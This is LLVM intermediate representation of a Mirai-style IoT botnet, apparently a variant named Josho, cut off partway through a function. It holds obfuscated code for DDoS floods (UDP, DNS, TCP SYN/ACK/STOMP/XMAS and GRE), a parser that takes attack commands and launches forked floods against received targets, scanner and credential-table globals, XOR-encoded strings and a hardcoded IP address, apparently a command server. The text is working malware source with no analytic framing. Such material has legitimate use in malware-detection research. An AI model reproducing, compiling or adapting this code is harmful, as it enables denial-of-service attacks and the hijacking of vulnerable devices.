; ModuleID = 'host/ir_sub/Josho.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.30 = type { [16 x i64] }
%struct.timeval.31 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"5:?;\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"165.227.43.162\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, %17
  %19 = sub i32 0, 1
  %20 = add i32 %18, %19
  %21 = sub i32 0, %20
  %22 = add nsw i32 %17, 1
  %23 = sext i32 %21 to i64
  %24 = mul i64 %23, 8
  %25 = call i8* @realloc(i8* %15, i64 %24) #6
  %26 = bitcast i8* %25 to %struct.attack_method**
  store %struct.attack_method** %26, %struct.attack_method*** @methods, align 8
  %27 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %28 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %29 = load i8, i8* @methods_len, align 1
  %30 = sub i8 0, 1
  %31 = sub i8 %29, %30
  %32 = add i8 %29, 1
  store i8 %31, i8* @methods_len, align 1
  %33 = zext i8 %29 to i64
  %34 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %28, i64 %33
  store %struct.attack_method* %27, %struct.attack_method** %34, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %28

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %1, align 4
  br label %2

; <label>:28:                                     ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %251

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = add i64 %25, -3832414323090601558
  %27 = sub i64 %26, 4
  %28 = sub i64 %27, -3832414323090601558
  %29 = sub i64 %25, 4
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %4, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %17
  br label %251

; <label>:34:                                     ; preds = %17
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  %37 = load i8, i8* %35, align 1
  store i8 %37, i8* %7, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = add i64 %39, -6024159125259276345
  %41 = sub i64 %40, 1
  %42 = sub i64 %41, -6024159125259276345
  %43 = sub i64 %39, 1
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* %4, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %34
  br label %251

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  store i8 %51, i8* %8, align 1
  %52 = load i32, i32* %4, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 %53, 1630321019992119087
  %55 = sub i64 %54, 1
  %56 = add i64 %55, 1630321019992119087
  %57 = sub i64 %53, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %4, align 4
  %59 = load i8, i8* %8, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %48
  br label %251

; <label>:63:                                     ; preds = %48
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = load i8, i8* %8, align 1
  %67 = zext i8 %66 to i64
  %68 = mul i64 5, %67
  %69 = icmp ult i64 %65, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %63
  br label %251

; <label>:71:                                     ; preds = %63
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i64
  %74 = call noalias i8* @calloc(i64 %73, i64 24) #6
  %75 = bitcast i8* %74 to %struct.attack_target*
  store %struct.attack_target* %75, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %76

; <label>:76:                                     ; preds = %126, %71
  %77 = load i32, i32* %5, align 4
  %78 = load i8, i8* %8, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %132

; <label>:81:                                     ; preds = %76
  %82 = load i8*, i8** %3, align 8
  %83 = bitcast i8* %82 to i32*
  %84 = load i32, i32* %83, align 4
  %85 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 1
  store i32 %84, i32* %89, align 4
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 4
  store i8* %91, i8** %3, align 8
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %3, align 8
  %94 = load i8, i8* %92, align 1
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 2
  store i8 %94, i8* %99, align 4
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = sub i64 %101, 7332296524729360153
  %103 = sub i64 %102, 5
  %104 = add i64 %103, 7332296524729360153
  %105 = sub i64 %101, 5
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %4, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 0
  store i16 2, i16* %112, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 1
  %118 = load i32, i32* %117, align 4
  %119 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i64 %121
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i32 0, i32 0
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %123, i32 0, i32 2
  %125 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %124, i32 0, i32 0
  store i32 %118, i32* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %81
  %127 = load i32, i32* %5, align 4
  %128 = sub i32 %127, -1845610790
  %129 = add i32 %128, 1
  %130 = add i32 %129, -1845610790
  %131 = add nsw i32 %127, 1
  store i32 %130, i32* %5, align 4
  br label %76

; <label>:132:                                    ; preds = %76
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = icmp ult i64 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %251

; <label>:137:                                    ; preds = %132
  %138 = load i8*, i8** %3, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %3, align 8
  %140 = load i8, i8* %138, align 1
  store i8 %140, i8* %9, align 1
  %141 = load i32, i32* %4, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 %142, 8198848643432233357
  %144 = sub i64 %143, 1
  %145 = sub i64 %144, 8198848643432233357
  %146 = sub i64 %142, 1
  %147 = trunc i64 %145 to i32
  store i32 %147, i32* %4, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp sgt i32 %149, 0
  br i1 %150, label %151, label %243

; <label>:151:                                    ; preds = %137
  %152 = load i8, i8* %9, align 1
  %153 = zext i8 %152 to i64
  %154 = call noalias i8* @calloc(i64 %153, i64 16) #6
  %155 = bitcast i8* %154 to %struct.attack_option*
  store %struct.attack_option* %155, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %156

; <label>:156:                                    ; preds = %235, %151
  %157 = load i32, i32* %5, align 4
  %158 = load i8, i8* %9, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp slt i32 %157, %159
  br i1 %160, label %161, label %242

; <label>:161:                                    ; preds = %156
  %162 = load i32, i32* %4, align 4
  %163 = sext i32 %162 to i64
  %164 = icmp ult i64 %163, 1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %161
  br label %251

; <label>:166:                                    ; preds = %161
  %167 = load i8*, i8** %3, align 8
  %168 = getelementptr inbounds i8, i8* %167, i32 1
  store i8* %168, i8** %3, align 8
  %169 = load i8, i8* %167, align 1
  %170 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %173, i32 0, i32 1
  store i8 %169, i8* %174, align 8
  %175 = load i32, i32* %4, align 4
  %176 = sext i32 %175 to i64
  %177 = sub i64 0, 1
  %178 = add i64 %176, %177
  %179 = sub i64 %176, 1
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i32, i32* %4, align 4
  %182 = sext i32 %181 to i64
  %183 = icmp ult i64 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %166
  br label %251

; <label>:185:                                    ; preds = %166
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  store i8 %188, i8* %12, align 1
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %190, 5054869228203142341
  %192 = sub i64 %191, 1
  %193 = sub i64 %192, 5054869228203142341
  %194 = sub i64 %190, 1
  %195 = trunc i64 %193 to i32
  store i32 %195, i32* %4, align 4
  %196 = load i32, i32* %4, align 4
  %197 = load i8, i8* %12, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp slt i32 %196, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %185
  br label %251

; <label>:201:                                    ; preds = %185
  %202 = load i8, i8* %12, align 1
  %203 = zext i8 %202 to i32
  %204 = sub i32 0, 1
  %205 = sub i32 %203, %204
  %206 = add nsw i32 %203, 1
  %207 = sext i32 %205 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 1) #6
  %209 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i32 0, i32 0
  store i8* %208, i8** %213, align 8
  %214 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = load i8*, i8** %3, align 8
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  call void @util_memcpy(i8* %219, i8* %220, i32 %222)
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  %225 = load i8*, i8** %3, align 8
  %226 = sext i32 %224 to i64
  %227 = getelementptr inbounds i8, i8* %225, i64 %226
  store i8* %227, i8** %3, align 8
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = load i32, i32* %4, align 4
  %231 = sub i32 %230, -1888394531
  %232 = sub i32 %231, %229
  %233 = add i32 %232, -1888394531
  %234 = sub nsw i32 %230, %229
  store i32 %233, i32* %4, align 4
  br label %235

; <label>:235:                                    ; preds = %201
  %236 = load i32, i32* %5, align 4
  %237 = sub i32 0, %236
  %238 = sub i32 0, 1
  %239 = add i32 %237, %238
  %240 = sub i32 0, %239
  %241 = add nsw i32 %236, 1
  store i32 %240, i32* %5, align 4
  br label %156

; <label>:242:                                    ; preds = %156
  br label %243

; <label>:243:                                    ; preds = %242, %137
  %244 = call i32* @__errno_location() #7
  store i32 0, i32* %244, align 4
  %245 = load i32, i32* %6, align 4
  %246 = load i8, i8* %7, align 1
  %247 = load i8, i8* %8, align 1
  %248 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %249 = load i8, i8* %9, align 1
  %250 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %245, i8 zeroext %246, i8 zeroext %247, %struct.attack_target* %248, i8 zeroext %249, %struct.attack_option* %250)
  br label %251

; <label>:251:                                    ; preds = %243, %200, %184, %165, %136, %70, %62, %47, %33, %16
  %252 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %253 = icmp ne %struct.attack_target* %252, null
  br i1 %253, label %254, label %257

; <label>:254:                                    ; preds = %251
  %255 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %256 = bitcast %struct.attack_target* %255 to i8*
  call void @free(i8* %256) #6
  br label %257

; <label>:257:                                    ; preds = %254, %251
  %258 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %259 = icmp ne %struct.attack_option* %258, null
  br i1 %259, label %260, label %264

; <label>:260:                                    ; preds = %257
  %261 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %262 = load i8, i8* %9, align 1
  %263 = zext i8 %262 to i32
  call void @free_opts(%struct.attack_option* %261, i32 %263)
  br label %264

; <label>:264:                                    ; preds = %260, %257
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %72

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %72

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 0, 1
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 1
  store i32 %70, i32* %15, align 4
  br label %37

; <label>:72:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %39

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %36

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 %31, -793452500
  %33 = add i32 %32, 1
  %34 = add i32 %33, -793452500
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %5, align 4
  br label %10

; <label>:36:                                     ; preds = %10
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  br label %39

; <label>:39:                                     ; preds = %36, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
